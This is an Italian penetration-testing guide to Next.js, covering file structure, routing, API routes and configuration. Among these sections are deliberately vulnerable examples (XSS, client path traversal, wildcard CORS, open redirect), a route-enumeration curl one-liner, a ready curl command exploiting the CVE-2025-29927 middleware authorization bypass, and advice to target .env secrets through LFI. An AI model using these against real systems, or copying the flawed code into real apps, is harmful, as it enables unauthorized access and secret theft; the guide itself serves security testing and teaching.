# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Architettura generale di un'applicazione Next.js

### Struttura tipica dei file

Un progetto Next.js standard segue una struttura specifica di file e directory che facilita funzionalità come routing, endpoint API e gestione delle risorse statiche. Ecco una struttura tipica:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Directory e File Principali

- **public/:** Ospita asset statici come immagini, font e altri file. I file qui sono accessibili al percorso root (`/`).
- **app/:** Directory centrale per le pagine dell’applicazione, layout, componenti e API routes. Adotta il paradigma **App Router**, abilitando funzionalità avanzate di routing e la separazione server-client dei componenti.
- **app/layout.tsx:** Definisce il layout root dell’applicazione, avvolgendo tutte le pagine e fornendo elementi UI coerenti come header, footer e barre di navigazione.
- **app/page.tsx:** Funziona come punto di ingresso per la route root `/`, rendendo la home page.
- **app/[route]/page.tsx:** Gestisce route statiche e dinamiche. Ogni cartella dentro `app/` rappresenta un segmento di route, e il `page.tsx` al suo interno corrisponde al componente della route.
- **app/api/:** Contiene API routes, permettendo di creare funzioni serverless che gestiscono richieste HTTP. Queste route sostituiscono la tradizionale directory `pages/api`.
- **app/components/:** Contiene componenti React riutilizzabili che possono essere usati in diverse pagine e layout.
- **app/styles/:** Contiene file CSS globali e CSS Modules per styling a livello di componente.
- **app/utils/:** Include funzioni di utilità, moduli helper e altra logica non-UI condivisibile nell’applicazione.
- **.env.local:** Memorizza variabili d’ambiente specifiche per l’ambiente di sviluppo locale. Queste variabili **non** vengono committate al version control.
- **next.config.js:** Personalizza il comportamento di Next.js, incluse configurazioni webpack, variabili d’ambiente e impostazioni di sicurezza.
- **tsconfig.json:** Configura le impostazioni TypeScript per il progetto, abilitando il type checking e altre funzionalità TypeScript.
- **package.json:** Gestisce le dipendenze del progetto, gli script e i metadata.
- **README.md:** Fornisce documentazione e informazioni sul progetto, incluse istruzioni di setup, linee guida d’uso e altri dettagli rilevanti.
- **yarn.lock / package-lock.json:** Bloccano le dipendenze del progetto a versioni specifiche, assicurando installazioni coerenti tra ambienti diversi.

## Lato client in Next.js

### Routing basato sui file nella directory `app`

La directory `app` è la pietra angolare del routing nelle ultime versioni di Next.js. Sfrutta il filesystem per definire le route, rendendo la gestione delle route intuitiva e scalabile.

<details>

<summary>Gestione del percorso root /</summary>

**Struttura dei file:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**File principali:**

- **`app/page.tsx`**: Gestisce le richieste al percorso root `/`.
- **`app/layout.tsx`**: Definisce il layout dell'applicazione, avvolgendo tutte le pagine.

**Implementazione:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Spiegazione:**

- **Definizione della route:** Il file `page.tsx` direttamente sotto la directory `app` corrisponde alla route `/`.
- **Rendering:** Questo componente rende il contenuto della pagina principale.
- **Integrazione del layout:** Il componente `HomePage` è avvolto da `layout.tsx`, che può includere header, footer e altri elementi comuni.

</details>

<details>

<summary>Gestione di altri percorsi statici</summary>

**Esempio: route `/about`**

**Struttura dei file:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementazione:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Spiegazione:**

- **Route Definition:** Il file `page.tsx` all'interno della cartella `about` corrisponde alla route `/about`.
- **Rendering:** Questo componente mostra il contenuto della pagina about.

</details>

<details>

<summary>Rotte dinamiche</summary>

Le rotte dinamiche permettono di gestire percorsi con segmenti variabili, consentendo alle applicazioni di mostrare contenuti basati su parametri come ID, slug, ecc.

**Esempio: `/posts/[id]` Route**

**Struttura dei file:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementazione:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Spiegazione:**

- **Segmento dinamico:** `[id]` indica un segmento dinamico nella route, catturando il parametro `id` dall'URL.
- **Accesso ai parametri:** L'oggetto `params` contiene i parametri dinamici, accessibili all'interno del componente.
- **Corrispondenza delle route:** Qualsiasi path che corrisponde a `/posts/*`, come `/posts/1`, `/posts/abc`, ecc., sarà gestito da questo componente.

</details>

<details>

<summary>Route annidate</summary>

Next.js supporta il routing annidato, consentendo strutture di route gerarchiche che rispecchiano la struttura delle directory.

**Esempio: route `/dashboard/settings/profile`**

**Struttura dei file:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementazione:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Spiegazione:**

- **Nidificazione profonda:** Il file `page.tsx` all'interno di `dashboard/settings/profile/` corrisponde alla route `/dashboard/settings/profile`.
- **Riflessione della gerarchia:** La struttura delle directory riflette il percorso URL, migliorando la manutenibilità e la chiarezza.

</details>

<details>

<summary>Rotte catch-all</summary>

Le rotte catch-all gestiscono più segmenti annidati o percorsi sconosciuti, offrendo flessibilità nella gestione delle route.

**Esempio: Rotta `/*`**

**Struttura dei file:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementazione:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Spiegazione:**

- **Catch-All Segment:** `[...slug]` cattura tutti i segmenti di percorso rimanenti come un array.
- **Usage:** Utile per gestire scenari di routing dinamico come percorsi generati dagli utenti, categorie annidate, ecc.
- **Route Matching:** Percorsi come `/anything/here`, `/foo/bar/baz`, ecc., sono gestiti da questo componente.

</details>

### Potenziali vulnerabilità lato client

Sebbene Next.js fornisca una base sicura, pratiche di programmazione improprie possono introdurre vulnerabilità. Le principali vulnerabilità lato client includono:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Gli attacchi XSS si verificano quando script dannosi vengono iniettati in siti web di fiducia. Gli aggressori possono eseguire script nei browser degli utenti, rubando dati o eseguendo azioni per conto dell'utente.

**Esempio di codice vulnerabile:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Perché è vulnerabile:** L'uso di `dangerouslySetInnerHTML` con input non attendibili permette agli attaccanti di iniettare script malevoli.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Si verifica quando gli input degli utenti vengono gestiti in modo improprio nei template, permettendo agli attaccanti di iniettare ed eseguire template o espressioni.

**Esempio di codice vulnerabile:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Perché è vulnerabile:** Se `template` o `data` includono contenuti malevoli, ciò può causare l'esecuzione di codice indesiderato.

</details>

<details>

<summary>Client Path Traversal</summary>

È una vulnerabilità che permette agli attaccanti di manipolare i percorsi lato client per eseguire azioni non intenzionate, come Cross-Site Request Forgery (CSRF). A differenza di server-side path traversal, che prende di mira il filesystem del server, CSPT si concentra sullo sfruttamento di meccanismi lato client per reindirizzare richieste API legittime verso endpoint malevoli.

**Esempio di codice vulnerabile:**

Un'applicazione Next.js permette agli utenti di caricare e scaricare file. La funzionalità di download è implementata lato client, dove gli utenti possono specificare il percorso del file da scaricare.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Scenario d'attacco

1. **Obiettivo dell'attaccante**: Eseguire un attacco CSRF per eliminare un file critico (es., `admin/config.json`) manipolando il `filePath`.
2. **Sfruttamento di CSPT**:
- **Input malevolo**: L'attaccante crea un URL con un `filePath` manipolato come `../deleteFile/config.json`.
- **Chiamata API risultante**: Il codice client esegue una richiesta a `/api/files/../deleteFile/config.json`.
- **Gestione dal server**: Se il server non valida il `filePath`, elabora la richiesta, potenzialmente eliminando o esponendo file sensibili.
3. **Esecuzione del CSRF**:
- **Link costruito**: L'attaccante invia alla vittima un link o incorpora uno script malevolo che innesca la richiesta di download con il `filePath` manipolato.
- **Esito**: La vittima esegue inconsapevolmente l'azione, portando ad accesso o eliminazione non autorizzata di file.

</details>

### Ricognizione: scoperta delle route di export statico tramite _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Usa i percorsi scoperti (per esempio `/docs`, `/docs/content/examples`, `/signin`) per guidare i test di autenticazione e la scoperta degli endpoint.

## Lato server in Next.js

### Server-Side Rendering (SSR)

Le pagine vengono renderizzate sul server a ogni richiesta, garantendo che l'utente riceva HTML completamente renderizzato. In questo caso dovresti creare un server personalizzato per processare le richieste.

**Casi d'uso:**

- Contenuti dinamici che cambiano frequentemente.
- Ottimizzazione SEO, poiché i motori di ricerca possono eseguire il crawling della pagina completamente renderizzata.

**Implementazione:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Static Site Generation (SSG)

Le pagine vengono pre-renderizzate durante la fase di build, con tempi di caricamento più rapidi e carico del server ridotto.

**Casi d'uso:**

- Contenuti che non cambiano frequentemente.
- Blog, documentazione, pagine di marketing.

**Implementazione:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Funzioni serverless (API Routes)

Next.js permette la creazione di endpoint API come funzioni serverless. Queste funzioni vengono eseguite on‑demand senza la necessità di un server dedicato.

**Casi d'uso:**

- Gestione dell'invio dei moduli.
- Interazione con i database.
- Elaborazione dei dati o integrazione con API di terze parti.

**Implementazione:**

Con l'introduzione della directory `app` in Next.js 13, il routing e la gestione delle API sono diventati più flessibili e potenti. Questo approccio moderno si allinea strettamente al sistema di routing basato sui file ma introduce capacità avanzate, incluso il supporto per componenti server e client.

#### Gestore di route di base

**Struttura dei file:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementazione:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Explanation:**

- **Location:** Le route API sono collocate sotto la directory `app/api/`.
- **File Naming:** Ogni endpoint API risiede nella propria cartella che contiene un file `route.js` o `route.ts`.
- **Exported Functions:** Invece di un singolo default export, vengono esportate funzioni specifiche per i metodi HTTP (es. `GET`, `POST`).
- **Response Handling:** Usa il costruttore `Response` per ritornare le risposte, consentendo maggiore controllo su header e status code.

#### Come gestire altri percorsi e metodi:

<details>

<summary>Handling Specific HTTP Methods</summary>

Next.js 13+ permette di definire handler per metodi HTTP specifici all'interno dello stesso file `route.js` o `route.ts`, favorendo codice più chiaro e organizzato.

**Esempio:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Spiegazione:**

- **Esportazioni Multiple:** Ogni metodo HTTP (`GET`, `PUT`, `DELETE`) ha la propria funzione esportata.
- **Parametri:** Il secondo argomento fornisce accesso ai parametri di route tramite `params`.
- **Risposte Migliorate:** Maggior controllo sugli oggetti response, permettendo la gestione precisa di header e status code.

</details>

<details>

<summary>Catch-All e rotte annidate</summary>

Next.js 13+ supporta funzionalità di routing avanzate come catch-all routes e API routes annidate, permettendo strutture API più dinamiche e scalabili.

**Esempio di Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Spiegazione:**

- **Sintassi:** `[...]` indica un segmento catch-all che cattura tutti i percorsi annidati.
- **Uso:** Utile per API che devono gestire profondità di route variabili o segmenti dinamici.

**Esempio di route annidate:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Spiegazione:**

- **Annidamento profondo:** Consente strutture API gerarchiche, riflettendo le relazioni tra risorse.
- **Accesso ai parametri:** Accedi facilmente a più parametri di route tramite l'oggetto `params`.

</details>

<details>

<summary>Gestione delle API routes in Next.js 12 e versioni precedenti</summary>

## API Routes nella directory `pages` (Next.js 12 e versioni precedenti)

Prima che Next.js 13 introducesse la directory `app` e funzionalità di routing migliorate, le API routes erano definite principalmente nella directory `pages`. Questo approccio è ancora ampiamente usato e supportato in Next.js 12 e nelle versioni precedenti.

#### Route API di base

**Struttura dei file:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementazione:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Spiegazione:**

- **Location:** Le API routes risiedono sotto la directory `pages/api/`.
- **Export:** Usa `export default` per definire la funzione handler.
- **Function Signature:** Il handler riceve gli oggetti `req` (HTTP request) e `res` (HTTP response).
- **Routing:** Il nome del file (`hello.js`) corrisponde all'endpoint `/api/hello`.

#### Route API dinamiche

**Struttura dei file:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementazione:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Spiegazione:**

- **Segmenti dinamici:** Le parentesi quadre (`[id].js`) denotano segmenti di route dinamici.
- **Accesso ai parametri:** Usa `req.query.id` per accedere al parametro dinamico.
- **Gestione dei metodi:** Utilizza la logica condizionale per gestire diversi metodi HTTP (`GET`, `PUT`, `DELETE`, ecc.).

#### Gestire diversi metodi HTTP

Mentre l'esempio base di API route gestisce tutti i metodi HTTP all'interno di una singola funzione, puoi strutturare il tuo codice per gestire ogni metodo esplicitamente per maggiore chiarezza e manutenibilità.

**Esempio:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Buone pratiche:**

- **Separazione delle responsabilità:** Separa chiaramente la logica per i diversi metodi HTTP.
- **Coerenza delle risposte:** Assicurati che le strutture delle risposte siano coerenti per facilitare la gestione lato client.
- **Gestione degli errori:** Gestisci in modo appropriato metodi non supportati ed errori imprevisti.

</details>

### Configurazione CORS

Controlla quali origini possono accedere agli endpoint delle API, mitigando le vulnerabilità legate a Cross-Origin Resource Sharing (CORS).

**Esempio di cattiva configurazione:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Nota che **CORS può anche essere configurato in tutte le route API** all'interno del file **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problema:**

- **`Access-Control-Allow-Origin: '*'`:** Permette a qualsiasi sito web di accedere all'API, consentendo potenzialmente a siti maligni di interagire con la tua API senza restrizioni.
- **Ampia apertura dei metodi:** Consentire tutti i metodi può permettere ad attaccanti di eseguire azioni indesiderate.

**Come gli attaccanti lo sfruttano:**

Gli attaccanti possono creare siti web maligni che inviano richieste alla tua API, abusando potenzialmente di funzionalità come il recupero dati, la manipolazione dei dati o l'innesco di azioni indesiderate a nome di utenti autenticati.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Esposizione del codice server nel client

Può essere facile **riutilizzare codice usato dal server anche in codice esposto e utilizzato dal client**, il modo migliore per assicurarsi che un file di codice non sia mai esposto al client è usare questo import all'inizio del file:
```js
import "server-only"
```
## File chiave e i loro ruoli

### `middleware.ts` / `middleware.js`

**Posizione:** Root del progetto o all'interno di `src/`.

**Scopo:** Esegue codice nella server-side serverless function prima che una request venga processata, permettendo operazioni come authentication, redirects o modifica delle responses.

**Flusso di esecuzione:**

1. **Incoming Request:** Il middleware intercetta la request.
2. **Processing:** Esegue operazioni basate sulla request (es. check authentication).
3. **Response Modification:** Può alterare la response o passare il controllo al handler successivo.

**Esempi d'uso:**

- Redirecting unauthenticated users.
- Adding custom headers.
- Logging requests.

**Esempio di configurazione:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Se l'autorizzazione è applicata nel middleware, le release di Next.js interessate (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) possono essere bypassate iniettando l'header `x-middleware-subrequest`. Il framework salterà la ricorsione del middleware e restituirà la pagina protetta.

- Il comportamento di base è tipicamente un reindirizzamento 307 verso una route di login come `/api/auth/signin`.
- Invia un valore lungo per `x-middleware-subrequest` (ripeti `middleware` per raggiungere `MAX_RECURSION_DEPTH`) per far diventare la risposta 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Poiché le pagine autenticate caricano molte risorse secondarie, aggiungi l'header a ogni richiesta (es., Burp Match/Replace con una stringa di match vuota) per evitare che gli asset vengano reindirizzati.

### `next.config.js`

**Posizione:** Radice del progetto.

**Scopo:** Configura il comportamento di Next.js, abilitando o disabilitando funzionalità, personalizzando le configurazioni di webpack, impostando variabili d'ambiente e configurando diverse funzionalità di sicurezza.

**Principali configurazioni di sicurezza:**

<details>

<summary>Intestazioni di sicurezza</summary>

Le intestazioni di sicurezza aumentano la protezione della tua applicazione istruendo i browser su come gestire i contenuti. Aiutano a mitigare vari attacchi come Cross-Site Scripting (XSS), Clickjacking e MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Esempi:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Impostazioni di Ottimizzazione Immagini</summary>

Next.js ottimizza le immagini per le prestazioni, ma le misconfigurazioni possono portare a vulnerabilità di sicurezza, come permettere a fonti non affidabili di iniettare contenuti dannosi.

**Esempio di Configurazione Errata:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problema:**

- **`'*'`:** Permette il caricamento di immagini da qualsiasi fonte esterna, inclusi domini non affidabili o malevoli. Attackers possono ospitare immagini contenenti payloads malevoli o contenuti che fuorviano gli utenti.
- Un altro problema potrebbe essere consentire un dominio **dove chiunque può caricare un'immagine** (come `raw.githubusercontent.com`)

**Come gli attackers lo sfruttano:**

Iniettando immagini da fonti malevole, attackers possono eseguire phishing, mostrare informazioni fuorvianti o sfruttare vulnerabilità nelle librerie di rendering delle immagini.

</details>

<details>

<summary>Esposizione delle variabili d'ambiente</summary>

Gestisci le informazioni sensibili come API keys e database credentials in modo sicuro senza esporle al client.

#### a. Esposizione di variabili sensibili

**Esempio di cattiva configurazione:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problema:**

- **`SECRET_API_KEY`:** Senza il prefisso `NEXT_PUBLIC_`, Next.js non espone le variabili al client. Tuttavia, se viene prefissato per errore (es. `NEXT_PUBLIC_SECRET_API_KEY`), diventa accessibile dal client.

**Come gli attaccanti lo sfruttano:**

Se variabili sensibili sono esposte al client, gli attaccanti possono recuperarle ispezionando il codice lato client o le richieste di rete, ottenendo accesso non autorizzato ad API, database o altri servizi.

</details>

<details>

<summary>Reindirizzamenti</summary>

Gestisci i reindirizzamenti e le riscritture degli URL all'interno della tua applicazione, assicurandoti che gli utenti vengano indirizzati correttamente senza introdurre open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Esempio di cattiva configurazione:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Destinazione Dinamica:** Consente agli utenti di specificare qualsiasi URL, permettendo open redirect attacks.
- **Affidarsi all'input dell'utente:** Il reindirizzamento verso URL forniti dagli utenti senza validazione può portare a phishing, malware distribution o credential theft.

**Come gli attaccanti lo sfruttano:**

Gli attaccanti possono creare URL che sembrano provenire dal tuo dominio ma reindirizzano gli utenti a siti malevoli. Ad esempio:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gli utenti che si fidano del dominio originale potrebbero inconsapevolmente navigare verso siti dannosi.

</details>

<details>

<summary>Webpack Configuration</summary>

Personalizza le configurazioni di Webpack per la tua applicazione Next.js, che possono introdurre involontariamente vulnerabilità di sicurezza se non gestite con cautela.

#### a. Esposizione di moduli sensibili

**Esempio di configurazione errata:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problema:**

- **Esposizione di percorsi sensibili:** L'aliasing di directory sensibili e il consentire l'accesso lato client possono leak informazioni riservate.
- **Inclusione di segreti nel bundle:** Se file sensibili vengono inclusi nel bundle destinato al client, i loro contenuti diventano accessibili tramite source maps o ispezionando il codice lato client.

**Come gli attaccanti lo sfruttano:**

Gli attaccanti possono accedere o ricostruire la struttura delle directory dell'applicazione, potenzialmente trovando e sfruttando file o dati sensibili.

</details>

### `pages/_app.js` e `pages/_document.js`

#### **`pages/_app.js`**

**Scopo:** Sovrascrive il componente App predefinito, consentendo stato globale, stili e componenti di layout.

**Casi d'uso:**

- Iniettare CSS globale.
- Aggiungere wrapper di layout.
- Integrare librerie di gestione dello stato.

**Esempio:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Scopo:** Sovrascrive il Document predefinito, permettendo la personalizzazione dei tag HTML e Body.

**Casi d'uso:**

- Modificare i tag `<html>` o `<body>`.
- Aggiungere meta tag o script personalizzati.
- Integrare font di terze parti.

**Esempio:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Server personalizzato (opzionale)

**Scopo:** Anche se Next.js include un server integrato, puoi creare un server personalizzato per casi d'uso avanzati come routing personalizzato o l'integrazione con servizi backend esistenti.

**Nota:** L'uso di un server personalizzato può limitare le opzioni di deployment, specialmente su piattaforme come Vercel che ottimizzano per il server integrato di Next.js.

**Esempio:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Considerazioni architetturali e di sicurezza aggiuntive

### Variabili d'ambiente e configurazione

**Scopo:** Gestire informazioni sensibili e impostazioni di configurazione al di fuori del codice.

**Migliori pratiche:**

- **Usa file `.env`:** Conserva variabili come chiavi API in `.env.local` (escluso dal controllo della versione).
- **Accedi alle variabili in modo sicuro:** Usa `process.env.VARIABLE_NAME` per accedere alle variabili d'ambiente.
- **Non esporre mai i segreti sul Client:** Assicurati che le variabili sensibili siano usate solo server-side.

**Esempio:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Note:** Per limitare le variabili solo al lato server, ometterle dall'oggetto `env` o anteporre `NEXT_PUBLIC_` per l'esposizione al client.

### Useful server artifacts to target via LFI/download endpoints

Se trovi un path traversal o un'API di download in un'app Next.js, prendi di mira gli artefatti compilati che contengono leak di segreti lato server e la logica di auth:

- `.env` / `.env.local` per segreti di sessione e credenziali dei provider.
